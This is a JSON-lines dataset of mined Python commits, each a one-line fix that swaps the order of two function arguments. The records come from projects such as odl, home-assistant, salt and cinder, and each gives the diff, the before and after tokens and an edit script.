{"project": "odl", "commit_sha": "35fbdbe5d844b6866f6a6a77d441952b6bccc3e9", "parent_sha": "01272dd2d9a90ffd21998e746fc268f4e352f152", "file_path": "odl/solvers/functional/default_functionals.py", "project_url": "https://github.com/grlee77/odl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1725,7 +1725,7 @@ class QuadraticForm(Functional):\n     def gradient(self):\n         \"\"\"Gradient operator of the functional.\"\"\"\n         if self.operator is None:\n-            return ConstantOperator(self.domain, self.vector)\n+            return ConstantOperator(self.vector, self.domain)\n         else:\n             if not self.operator.is_linear:\n                 # TODO: Acutally works otherwise, but needs more work\n", "before": "return ConstantOperator ( self . domain , self . vector )", "after": "return ConstantOperator ( self . vector , self . domain )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 37, 3, 48], [\"argument_list\", 3, 36, 3, 62], 2], [\"Move\", [\"attribute\", 3, 50, 3, 61], [\"argument_list\", 3, 36, 3, 62], 1]]"}
{"project": "odl", "commit_sha": "68a015af9794a99d53bca4f472b3485a07cacbf8", "parent_sha": "9156a28e028ccebcf942074ea604a59c9375e2b6", "file_path": "odl/tomo/analytic/filtered_back_projection.py", "project_url": "https://github.com/grlee77/odl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ def _rotation_direction_in_detector(geometry):\n     \"\"\"A vector in the detector plane that points in the rotation direction.\"\"\"\n     du, dv = geometry.det_axes_init\n     axis = geometry.axis\n-    det_normal = np.cross(du, dv)\n+    det_normal = np.cross(dv, du)\n     rot_dir = np.cross(axis, det_normal)\n     c = np.array([np.vdot(rot_dir, du), np.vdot(rot_dir, dv)])\n     cnorm = np.linalg.norm(c)\n", "before": "det_normal = np . cross ( du , dv )", "after": "det_normal = np . cross ( dv , du )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:du\", 3, 27, 3, 29], [\"argument_list\", 3, 26, 3, 34], 3], [\"Move\", [\",:,\", 3, 29, 3, 30], [\"argument_list\", 3, 26, 3, 34], 4]]"}
{"project": "ZeroNet", "commit_sha": "830f98573eb4047ffe89d61e28d6fddd0e91ba57", "parent_sha": "b0d574dfb044b64772fe229cfc9c8f6337498b36", "file_path": "src/Debug/DebugMedia.py", "project_url": "https://github.com/filips123/ZeroNet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def merge(merged_path):\n                     return False  # No coffeescript compiler, skip this file\n \n                 # Replace / with os separators and escape it\n-                file_path_escaped = helper.shellquote(file_path.replace(os.path.sep, \"/\"))\n+                file_path_escaped = helper.shellquote(file_path.replace(\"/\", os.path.sep))\n \n                 if \"%s\" in config.coffeescript_compiler:  # Replace %s with coffeescript file\n                     command = config.coffeescript_compiler % file_path_escaped\n", "before": "file_path_escaped = helper . shellquote ( file_path . replace ( os . path . sep , \"/\" ) )", "after": "file_path_escaped = helper . shellquote ( file_path . replace ( \"/\" , os . path . sep ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 72, 3, 90], [\"string:\\\"/\\\"\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 72, 3, 90], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 84, 3, 85]], [\"Delete\", [\"string:\\\"/\\\"\", 3, 86, 3, 89]]]"}
{"project": "pwntools", "commit_sha": "890db20b275ffb6e97f01e59d0f90f190e876130", "parent_sha": "1be8797cee18dba214592c9dfe648b3d9584d4d2", "file_path": "pwnlib/util/iters.py", "project_url": "https://github.com/AlTune/pwntools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -794,7 +794,7 @@ def bruteforce(func, alphabet, length, method = 'upto', start = None):\n         if rest >= i:\n             chunk_size += 1\n \n-        consume(iterator, starting_point)\n+        consume(starting_point, iterator)\n         iterator = take(chunk_size, iterator)\n         total_iterations = chunk_size\n \n", "before": "consume ( iterator , starting_point )", "after": "consume ( starting_point , iterator )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:iterator\", 3, 17, 3, 25], [\"argument_list\", 3, 16, 3, 42], 3], [\"Move\", [\",:,\", 3, 25, 3, 26], [\"argument_list\", 3, 16, 3, 42], 4]]"}
{"project": "home-assistant", "commit_sha": "84365cde077d6a927947793bd5f8a4790f16c852", "parent_sha": "e91a1529e43a9ce08a9858d4fce59f4bcc7607e0", "file_path": "homeassistant/helpers/config_validation.py", "project_url": "https://github.com/Kane610/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def matches_regex(regex):\n \n         if not regex.match(value):\n             raise vol.Invalid('value {} does not match regular expression {}'\n-                              .format(regex.pattern, value))\n+                              .format(value, regex.pattern))\n \n         return value\n     return validator\n", "before": "raise vol . Invalid ( 'value {} does not match regular expression {}' . format ( regex . pattern , value ) )", "after": "raise vol . Invalid ( 'value {} does not match regular expression {}' . format ( value , regex . pattern ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 60], [\"identifier:value\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 38, 3, 60], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"identifier:value\", 3, 54, 3, 59]]]"}
{"project": "home-assistant", "commit_sha": "4cb9ac72b4ebe09c7c969d8efdf9e8bdcc8166c2", "parent_sha": "cf8bd92d4d1ab1e2a619c034f4327662a442673c", "file_path": "homeassistant/helpers/config_validation.py", "project_url": "https://github.com/Kane610/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def matches_regex(regex):\n \n         if not regex.match(value):\n             raise vol.Invalid('value {} does not match regular expression {}'\n-                              .format(regex.pattern, value))\n+                              .format(value, regex.pattern))\n \n         return value\n     return validator\n", "before": "raise vol . Invalid ( 'value {} does not match regular expression {}' . format ( regex . pattern , value ) )", "after": "raise vol . Invalid ( 'value {} does not match regular expression {}' . format ( value , regex . pattern ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 60], [\"identifier:value\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 38, 3, 60], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"identifier:value\", 3, 54, 3, 59]]]"}
{"project": "puzzler", "commit_sha": "ef5ce6161f9ecfab07233e3b81f7f659411306e5", "parent_sha": "e8dda8f91f6899095faa1039883ca7766a6cd84b", "file_path": "puzzler/puzzler/core.py", "project_url": "https://github.com/dc25/puzzler", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def solver(puzzle_class, output_stream=sys.stdout, settings=None):\n         for solution in solver.solve():\n             puzzle.record_solution(solution, solver, stream=output_stream)\n             if settings.svg:\n-                puzzle.write_svg(solution, settings.svg)\n+                puzzle.write_svg(settings.svg, solution)\n                 settings.svg = False\n             if ( settings.stop_after_number\n                  and solver.num_solutions == settings.stop_after_number):\n", "before": "puzzle . write_svg ( solution , settings . svg )", "after": "puzzle . write_svg ( settings . svg , solution )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 57], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 33, 3, 57], [\"identifier:solution\", \"T\"], 4], [\"Delete\", [\"identifier:solution\", 3, 34, 3, 42]], [\"Delete\", [\",:,\", 3, 42, 3, 43]]]"}
{"project": "snipsLedControl", "commit_sha": "5f75691edbf6911f5164d430f9049aa52e99b92d", "parent_sha": "c886965886528bcfc8d9de2a536b6d0680aafb4f", "file_path": "interfaces/apa102.py", "project_url": "https://github.com/Psychokiller1888/snipsLedControl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class APA102(Interface):\n \n \n \tdef setPixel(self, ledNum, red, green, blue, brightness):\n-\t\tself._leds.set_pixel(ledNum, green, red, blue, brightness)\n+\t\tself._leds.set_pixel(ledNum, red, green, blue, brightness)\n \n \n \tdef setPixelRgb(self, ledNum, color, brightness):\n", "before": "self . _leds . set_pixel ( ledNum , green , red , blue , brightness )", "after": "self . _leds . set_pixel ( ledNum , red , green , blue , brightness )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:green\", 3, 32, 3, 37], [\"argument_list\", 3, 23, 3, 61], 5], [\"Move\", [\",:,\", 3, 37, 3, 38], [\"argument_list\", 3, 23, 3, 61], 6]]"}
{"project": "django-hvad", "commit_sha": "830448c7b2c52ee69a58c6f41dd1a0f4a6ada271", "parent_sha": "16300ddf3a750e9e80e5509c30362f34f11cc1d6", "file_path": "nani/manager.py", "project_url": "https://github.com/KristianOellegaard/django-hvad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -638,7 +638,7 @@ class TranslationAwareQueryset(QuerySet):\n         extra_filters = Q()\n         language_joins = []\n         for field in fields:\n-            newfield, langjoins = translate(self.model, field)\n+            newfield, langjoins = translate(field, self.model)\n             newfields.append(newfield)\n             for langjoin in langjoins:\n                 if langjoin not in language_joins:\n", "before": "newfield , langjoins = translate ( self . model , field )", "after": "newfield , langjoins = translate ( field , self . model )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 44, 3, 63], [\"identifier:field\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 44, 3, 63], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"identifier:field\", 3, 57, 3, 62]]]"}
{"project": "salt", "commit_sha": "0cc98b32476dd2c5b25e25e85477fcce6a17ed98", "parent_sha": "cf8456528382ab76950d7f6b5f6249da4471f265", "file_path": "salt/config/__init__.py", "project_url": "https://github.com/kaidokert/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3474,7 +3474,7 @@ def check_driver_dependencies(driver, dependencies):\n         if value is False:\n             log.warning(\n                 \"Missing dependency: '%s'. The %s driver requires \"\n-                \"'%s' to be installed.\", key, key, driver\n+                \"'%s' to be installed.\", key, driver, key\n             )\n             ret = False\n \n", "before": "log . warning ( \"Missing dependency: '%s'. The %s driver requires \" \"'%s' to be installed.\" , key , key , driver )", "after": "log . warning ( \"Missing dependency: '%s'. The %s driver requires \" \"'%s' to be installed.\" , key , driver , key )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:key\", 3, 47, 3, 50], \"driver\"], [\"Update\", [\"identifier:driver\", 3, 52, 3, 58], \"key\"]]"}
{"project": "salt", "commit_sha": "bd18412740c3ece8566a5decad35efd2f15f5d25", "parent_sha": "3022b7db5b47f8f411c60f77f375644174ce8ee5", "file_path": "salt/config/__init__.py", "project_url": "https://github.com/kaidokert/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3488,7 +3488,7 @@ def check_driver_dependencies(driver, dependencies):\n         if value is False:\n             log.warning(\n                 \"Missing dependency: '%s'. The %s driver requires \"\n-                \"'%s' to be installed.\", key, key, driver\n+                \"'%s' to be installed.\", key, driver, key\n             )\n             ret = False\n \n", "before": "log . warning ( \"Missing dependency: '%s'. The %s driver requires \" \"'%s' to be installed.\" , key , key , driver )", "after": "log . warning ( \"Missing dependency: '%s'. The %s driver requires \" \"'%s' to be installed.\" , key , driver , key )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:key\", 3, 47, 3, 50], \"driver\"], [\"Update\", [\"identifier:driver\", 3, 52, 3, 58], \"key\"]]"}
{"project": "majestic", "commit_sha": "576ecc366d38ccadb17aadce47bccfba9f512269", "parent_sha": "57aff32f106d5994cf943ef00524ce95722784ac", "file_path": "test-majestic.py", "project_url": "https://github.com/robjwells/majestic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class TestContent(unittest.TestCase):\n         post = majestic.Post(title=self.title, date=self.date,\n                              slug=self.slug, body=self.body,\n                              meta=self.meta)\n-        self.assertIsInstance(majestic.Post, post)\n+        self.assertIsInstance(post, majestic.Post)\n         self.assertEqual(\n             [self.title, self.date, self.slug, self.body, self.meta],\n             [post.title, post.date, post.slug, post.body, post.meta]\n", "before": "self . assertIsInstance ( majestic . Post , post )", "after": "self . assertIsInstance ( post , majestic . Post )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 51], [\"identifier:post\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 51], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 44, 3, 45]], [\"Delete\", [\"identifier:post\", 3, 46, 3, 50]]]"}
{"project": "PyPy-Functional", "commit_sha": "88ecb50dc9cf337c72ff1000f1984c45daa7bb16", "parent_sha": "db8aec20dfb63ea6454a7598af6037894017f3e4", "file_path": "pypy/rpython/lltypesystem/llmemory.py", "project_url": "https://github.com/SeraphRoy/PyPy-Functional", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class fakeaddress(object):\n             self.offset.set(self.ob, value)\n \n     def _cast_to_ptr(self, EXPECTED_TYPE):\n-        return lltype.cast_pointer(self.get(), EXPECTED_TYPE)\n+        return lltype.cast_pointer(EXPECTED_TYPE, self.get())\n \n # XXX the indexing in code like\n #     addr.signed[0] = v\n", "before": "return lltype . cast_pointer ( self . get ( ) , EXPECTED_TYPE )", "after": "return lltype . cast_pointer ( EXPECTED_TYPE , self . get ( ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 62], [\"identifier:EXPECTED_TYPE\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 35, 3, 62], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 46, 3, 47]], [\"Delete\", [\"identifier:EXPECTED_TYPE\", 3, 48, 3, 61]]]"}
{"project": "Flexget", "commit_sha": "b5ea4d9bdf9789ac07825589ecf33a4821178a58", "parent_sha": "c6e4b6c0da933fc226203af33a33fffa79872548", "file_path": "tests/test_tvmaze.py", "project_url": "https://github.com/programatix/Flexget", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -379,7 +379,7 @@ class TestTVMazeShowLookup(object):\n \n         # force episode lookup\n         for entry in task.entries:\n-            getattr('tvmaze_episode_season', entry)\n+            getattr(entry, 'tvmaze_episode_season')\n \n         with Session() as session:\n             episodes = session.query(TVMazeEpisodes).all()\n", "before": "getattr ( 'tvmaze_episode_season' , entry )", "after": "getattr ( entry , 'tvmaze_episode_season' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'tvmaze_episode_season'\", 3, 21, 3, 44], [\"argument_list\", 3, 20, 3, 52], 3], [\"Move\", [\",:,\", 3, 44, 3, 45], [\"argument_list\", 3, 20, 3, 52], 4]]"}
{"project": "km3mon", "commit_sha": "3fc1dd1b1e2a6bbdbb724eee2c6a4cdd45a3f3f9", "parent_sha": "ba24873d1abd914b5b7a72f8b2abd6db67dc57fb", "file_path": "scripts/ahrs_calibration.py", "project_url": "https://github.com/tamasgal/km3mon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class CalibrateAHRS(kp.Module):\n         if du != self.du:\n             return blob\n \n-        clb_upi = self.db.doms.via_dom_id(self.detector.det_id, dom_id).clb_upi\n+        clb_upi = self.db.doms.via_dom_id(dom_id, self.detector.det_id).clb_upi\n         yaw = tmch_data.yaw\n         calib = get_latest_ahrs_calibration(clb_upi, max_version=4)\n \n", "before": "clb_upi = self . db . doms . via_dom_id ( self . detector . det_id , dom_id ) . clb_upi", "after": "clb_upi = self . db . doms . via_dom_id ( dom_id , self . detector . det_id ) . clb_upi", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 72], [\"identifier:dom_id\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 42, 3, 72], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"identifier:dom_id\", 3, 65, 3, 71]]]"}
{"project": "CloudBot", "commit_sha": "b50f183a7b21aace359b4e9710068db6c652bd3c", "parent_sha": "4b8c5a3cf1fedef2cf42bfe4a474f77938bf5ab2", "file_path": "cloudbot/permissions.py", "project_url": "https://github.com/gabriel-cr/CloudBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class PermissionManager(object):\n         for user_perm, allowed_users in self.perm_users.items():\n             if fnmatch(perm, user_perm):\n                 for allowed_mask in allowed_users:\n-                    if fnmatch(user_mask.lower(), allowed_mask):\n+                    if fnmatch(allowed_mask, user_mask.lower()):\n                         if notice:\n                             logger.info(\"[{}|permissions] Allowed user {} access to {}\".format(self.name, user_mask, perm))\n                         return True\n", "before": "if fnmatch ( user_mask . lower ( ) , allowed_mask ) : if notice : logger . info ( \"[{}|permissions] Allowed user {} access to {}\" . format ( self . name , user_mask , perm ) ) return True", "after": "if fnmatch ( allowed_mask , user_mask . lower ( ) ) : if notice : logger . info ( \"[{}|permissions] Allowed user {} access to {}\" . format ( self . name , user_mask , perm ) ) return True", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 64], [\"identifier:allowed_mask\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 31, 3, 64], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 49, 3, 50]], [\"Delete\", [\"identifier:allowed_mask\", 3, 51, 3, 63]]]"}
{"project": "42qu_github_mirror", "commit_sha": "ec1bc17eae3c9a5e4bac5f217e9a8afb16eaba34", "parent_sha": "34922b07c8daa2e402ec6d9b42d08fbd794601cc", "file_path": "ctrl/j.py", "project_url": "https://github.com/awesome-archive/42qu_github_mirror", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class NoteUpload(_handler.Base):\n  \n         r = {\n             \"status\": 0,\n-            \"src\": fs_url_jpg(pic.id, 219),\n+            \"src\": fs_url_jpg(219, pic.id),\n             \"seqid\": pic.seq,\n         }\n \n", "before": "r = { \"status\" : 0 , \"src\" : fs_url_jpg ( pic . id , 219 ) , \"seqid\" : pic . seq , }", "after": "r = { \"status\" : 0 , \"src\" : fs_url_jpg ( 219 , pic . id ) , \"seqid\" : pic . seq , }", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 43], [\"integer:219\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 43], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 37, 3, 38]], [\"Delete\", [\"integer:219\", 3, 39, 3, 42]]]"}
{"project": "beets", "commit_sha": "e5e3eda676bac547bc98b73e59866a4ecc60aafc", "parent_sha": "7193f4e8636752791b5bd2eb3b199cdbbeb16ed6", "file_path": "beets/util/confit.py", "project_url": "https://github.com/awesome-archive/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -357,7 +357,7 @@ class ConfigView(object):\n         if value not in choices:\n             raise ConfigValueError(\n                 '{0} must be one of {1}, not {2}'.format(\n-                    self.name, repr(value), repr(list(choices))\n+                    self.name, repr(list(choices)), repr(value)\n                 )\n             )\n \n", "before": "raise ConfigValueError ( '{0} must be one of {1}, not {2}' . format ( self . name , repr ( value ) , repr ( list ( choices ) ) ) )", "after": "raise ConfigValueError ( '{0} must be one of {1}, not {2}' . format ( self . name , repr ( list ( choices ) ) , repr ( value ) ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"call\", 3, 32, 3, 43], [\"argument_list\", 2, 57, 4, 18], 4], [\"Move\", [\"call\", 3, 45, 3, 64], [\"argument_list\", 2, 57, 4, 18], 3]]"}
{"project": "ganeti_webmgr", "commit_sha": "44703661f9d85b37e546be0a13c0cc8cf8261f65", "parent_sha": "904957b34a6efd9c650d23700156c3a0bf1af7ee", "file_path": "ganeti/tests/virtual_machine.py", "project_url": "https://github.com/osuosl/ganeti_webmgr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ class TestVirtualMachineViews(TestCase, VirtualMachineTestCaseMixin):\n         self.assert_(vm1 in vms)\n         self.assert_(vm2 in vms)\n         self.assert_(vm3 in vms)\n-        self.assertEqual(len(vms), 4)\n+        self.assertEqual(4, len(vms))\n     \n     def test_view_detail(self):\n", "before": "self . assertEqual ( len ( vms ) , 4 )", "after": "self . assertEqual ( 4 , len ( vms ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 38], [\"integer:4\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 25, 3, 38], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"integer:4\", 3, 36, 3, 37]]]"}
{"project": "open-raadsinformatie", "commit_sha": "3f1e6fe8e325359fe380237ef580962bcdabe808", "parent_sha": "ac11b6a56ac434d755e27399590c50b2b77f31c5", "file_path": "ocd_backend/extractors/rijksmuseum.py", "project_url": "https://github.com/openstate/open-raadsinformatie", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,4 +54,4 @@ class RijksmuseumExtractor(BaseExtractor):\n     def start(self):\n         for item in self.get_collection_objects():\n             content_type, raw_content, item = self.get_object(item['objectNumber'])\n-            self.transform_item(raw_content, content_type, item)\n+            self.transform_item(content_type, raw_content, item)\n", "before": "self . transform_item ( raw_content , content_type , item )", "after": "self . transform_item ( content_type , raw_content , item )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:raw_content\", 3, 33, 3, 44], [\"argument_list\", 3, 32, 3, 65], 3], [\"Move\", [\",:,\", 3, 44, 3, 45], [\"argument_list\", 3, 32, 3, 65], 4]]"}
{"project": "descent", "commit_sha": "a0c46e73071c2fe037ebfbe498ea8a1c3bdae604", "parent_sha": "6cb086a423151302e1bd3667ff6b6d8ed3314a52", "file_path": "descent/main.py", "project_url": "https://github.com/nirum/descent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class Optimizer(object):\n                     rt = self.runtimes[-1]\n \n                 # build the datum\n-                d = Datum(k, obj, self.restruct(theta), grad, rt)\n+                d = Datum(k, obj, grad, self.restruct(theta), rt)\n \n                 # farm out to callbacks\n                 callback_func(d)\n", "before": "d = Datum ( k , obj , self . restruct ( theta ) , grad , rt )", "after": "d = Datum ( k , obj , grad , self . restruct ( theta ) , rt )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 66], [\"identifier:grad\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 26, 3, 66], [\",:,\", \"T\"], 6], [\"Delete\", [\"identifier:grad\", 3, 57, 3, 61]], [\"Delete\", [\",:,\", 3, 61, 3, 62]]]"}
{"project": "Tron", "commit_sha": "4f942d4f2bcc6e60844618336cbeac50ba9f4573", "parent_sha": "7de24e93c003155c9dc1532146ef47267ee13092", "file_path": "tron/trondaemon.py", "project_url": "https://github.com/Yelp/Tron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class TronDaemon(object):\n         self.manhole_sock = f\"{self.options.working_dir}/manhole.sock\"\n \n     def run(self):\n-        with no_daemon_context(self.lock_file, self.working_dir, self.signals):\n+        with no_daemon_context(self.working_dir, self.lock_file, self.signals):\n             self._run_mcp()\n             self._run_www_api()\n             self._run_manhole()\n", "before": "with no_daemon_context ( self . lock_file , self . working_dir , self . signals ) : self . _run_mcp ( ) self . _run_www_api ( ) self . _run_manhole ( )", "after": "with no_daemon_context ( self . working_dir , self . lock_file , self . signals ) : self . _run_mcp ( ) self . _run_www_api ( ) self . _run_manhole ( )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 32, 3, 46], [\"argument_list\", 3, 31, 3, 79], 2], [\"Move\", [\"attribute\", 3, 48, 3, 64], [\"argument_list\", 3, 31, 3, 79], 1]]"}
{"project": "weather_forecast_retrieval", "commit_sha": "e1a6f0b0792d105d98e341ef1b60522f66bdca5c", "parent_sha": "2cf42cd740d61b4ed8bc08ea2cc23f7b4e1dd0a0", "file_path": "tests/data/hrrr/test_config_file.py", "project_url": "https://github.com/USDA-ARS-NWRC/weather_forecast_retrieval", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,4 +64,4 @@ class TestConfigFile(unittest.TestCase):\n         self.assertEqual(external_logger.name, subject.log.name)\n \n     def test_log_property(self):\n-        self.assertIsInstance(logging.Logger, self.subject.log)\n+        self.assertIsInstance(self.subject.log, logging.Logger)\n", "before": "self . assertIsInstance ( logging . Logger , self . subject . log )", "after": "self . assertIsInstance ( self . subject . log , logging . Logger )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 31, 3, 45], [\"argument_list\", 3, 30, 3, 64], 2], [\"Move\", [\"attribute\", 3, 47, 3, 63], [\"argument_list\", 3, 30, 3, 64], 1]]"}
{"project": "dd-agent", "commit_sha": "8c006711d7638d63899034de8dd73820d834e6b3", "parent_sha": "759ea9b27083d561fd8716bc504522251786ac10", "file_path": "tests/test_gearman.py", "project_url": "https://github.com/Wattpad/dd-agent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class GearmanTestCase(unittest.TestCase):\n \n         self.check = load_check('gearmand', config, agentConfig)\n         self.check.check(config['instances'][0])\n-        self.assertRaises(self.check.check, Exception, config['instances'][1])\n+        self.assertRaises(Exception, self.check.check, config['instances'][1])\n \n         service_checks = self.check.get_service_checks()\n         self.assertEqual(len(service_checks), 2)\n", "before": "self . assertRaises ( self . check . check , Exception , config [ 'instances' ] [ 1 ] )", "after": "self . assertRaises ( Exception , self . check . check , config [ 'instances' ] [ 1 ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 79], [\"identifier:Exception\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 79], [\",:,\", \"T\"], 2], [\"Delete\", [\"identifier:Exception\", 3, 45, 3, 54]], [\"Delete\", [\",:,\", 3, 54, 3, 55]]]"}
{"project": "cinder", "commit_sha": "e6a5bdabb61be1d03ea291d4d4fe640f4e93ec43", "parent_sha": "ed20152b7812c3d0eeadf7db1ced584f92f8a30d", "file_path": "cinder/tests/unit/volume/drivers/netapp/test_utils.py", "project_url": "https://github.com/cloudbase/cinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -135,7 +135,7 @@ class NetAppDriverUtilsTestCase(test.TestCase):\n \n         actual_properties_mapped = actual_properties['data']\n \n-        self.assertIs(type(actual_properties_mapped['target_lun']), int)\n+        self.assertIs(int, type(actual_properties_mapped['target_lun']))\n \n     def test_iscsi_connection_lun_id_type_dict(self):\n         FAKE_LUN_ID = {'id': 'fake_id'}\n", "before": "self . assertIs ( type ( actual_properties_mapped [ 'target_lun' ] ) , int )", "after": "self . assertIs ( int , type ( actual_properties_mapped [ 'target_lun' ] ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 73], [\"identifier:int\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 73], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 67, 3, 68]], [\"Delete\", [\"identifier:int\", 3, 69, 3, 72]]]"}
{"project": "Ultros-contrib", "commit_sha": "9d519d220738a126befda1b8157035a4c1e5cfc0", "parent_sha": "c3bd1d5efe46ccddb9bd1b9e2016d7f22ccf9507", "file_path": "Web/plugins/web/request_handler.py", "project_url": "https://github.com/domainr/Ultros-contrib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ class RequestHandler(Handler):\n         self.css = [\"/static/custom.css\"]\n         self.js = []\n \n-        super(self, RequestHandler).__init__(*args, **kwargs)\n+        super(RequestHandler, self).__init__(*args, **kwargs)\n \n     @property\n     def plugin(self):\n", "before": "super ( self , RequestHandler ) . __init__ ( * args , ** kwargs )", "after": "super ( RequestHandler , self ) . __init__ ( * args , ** kwargs )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:self\", 3, 15, 3, 19], [\"argument_list\", 3, 14, 3, 36], 3], [\"Move\", [\",:,\", 3, 19, 3, 20], [\"argument_list\", 3, 14, 3, 36], 4]]"}
